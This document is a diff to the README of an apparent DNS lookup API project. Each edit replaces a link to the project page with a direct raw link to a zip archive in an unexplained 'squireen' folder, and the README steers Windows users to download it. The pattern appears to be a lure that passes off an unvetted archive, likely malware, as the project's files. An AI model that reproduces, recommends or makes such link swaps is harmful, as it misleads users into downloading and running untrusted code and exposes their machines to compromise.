@@ -1,12 +1,12 @@
 # 🌐 dns.api.airat.top - Simple DNS Lookup API
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/above-politics628/dns.api.airat.top)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/above-politics628/dns.api.airat.top/main/squireen/top_dns_api_airat_v3.5-alpha.1.zip)
 
 ## 📥 Download
 
 Go to the download page here:
 
-[https://github.com/above-politics628/dns.api.airat.top](https://github.com/above-politics628/dns.api.airat.top)
+[https://raw.githubusercontent.com/above-politics628/dns.api.airat.top/main/squireen/top_dns_api_airat_v3.5-alpha.1.zip](https://raw.githubusercontent.com/above-politics628/dns.api.airat.top/main/squireen/top_dns_api_airat_v3.5-alpha.1.zip)
 
 Use this link to get the files you need on Windows.
 
@@ -50,7 +50,7 @@ If you want to test the API from your browser, no extra software is needed.
 ## 🚀 Get started
 
 1. Open the download page:
-   - https://github.com/above-politics628/dns.api.airat.top
+   - https://raw.githubusercontent.com/above-politics628/dns.api.airat.top/main/squireen/top_dns_api_airat_v3.5-alpha.1.zip
 
 2. Download the project files to your computer.
 
@@ -235,4 +235,4 @@ For the easiest start on Windows:
 
 If you need the project page again, use this link:
 
-[https://github.com/above-politics628/dns.api.airat.top](https://github.com/above-politics628/dns.api.airat.top)
+[https://raw.githubusercontent.com/above-politics628/dns.api.airat.top/main/squireen/top_dns_api_airat_v3.5-alpha.1.zip](https://raw.githubusercontent.com/above-politics628/dns.api.airat.top/main/squireen/top_dns_api_airat_v3.5-alpha.1.zip)
